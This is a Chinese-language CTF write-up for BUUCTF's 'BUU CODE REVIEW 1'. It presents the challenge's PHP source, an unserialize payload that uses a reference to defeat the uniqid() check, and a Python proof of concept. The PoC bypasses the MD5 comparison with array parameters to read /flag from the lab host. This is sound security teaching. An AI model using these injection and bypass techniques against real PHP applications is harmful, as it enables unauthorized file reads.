---
title: BUUCTF - BUU CODE REVIEW 1 Writeup
cover: cover.png
date: 2022-01-30 12:52:58
description: BUU CODE REVIEW 1
tags:
- writeup
- buuctf
categories:
- writeups
---
# 打开链接，显示代码

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/10/6
 * Time: 8:04 PM
 */

highlight_file(__FILE__);

class BUU {
   public $correct = "";
   public $input = "";

   public function __destruct() {
       try {
           $this->correct = base64_encode(uniqid());
           if($this->correct === $this->input) {
               echo file_get_contents("/flag");
           }
       } catch (Exception $e) {
       }
   }
}

if($_GET['pleaseget'] === '1') {
    if($_POST['pleasepost'] === '2') {
        if(md5($_POST['md51']) == md5($_POST['md52']) && $_POST['md51'] != $_POST['md52']) {
            unserialize($_POST['obj']);
        }
    }
}
```

一共要读取5个参数：get参数pleaseget，post参数pleasepost、md51、md52和obj

> 考点1：php强弱类型比较
> 考点2：uniqid() 函数 //基于以微秒计的当前时间，生成一个唯一的 ID。
> 考点3：引用赋值

# php payload:

```php
class BUU{
    public $correct = "";
    public $input = "";
}
$b = new BUU();
$b->input = &$b->correct;
echo serialize($b);
# O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}
```

# poc:

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-
import requests
import re
flag = ''
url = 'http://1047cab0-ea8a-4945-8421-86af8b408454.node4.buuoj.cn:81/?pleaseget=1'
data = {'pleasepost':'2','md51[]':'1','md52[]':'2','obj':'O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";R:2;}'} #md5值比较绕过有两种方法：1.互联网搜索两个MD5值为0e开头的字符串;2.使用list绕过
res = requests.post(url,data)
if 'flag{' in res.text:
    flag = re.search(r'flag\{(.*)\}',res.text)[0]
    print(flag)
```
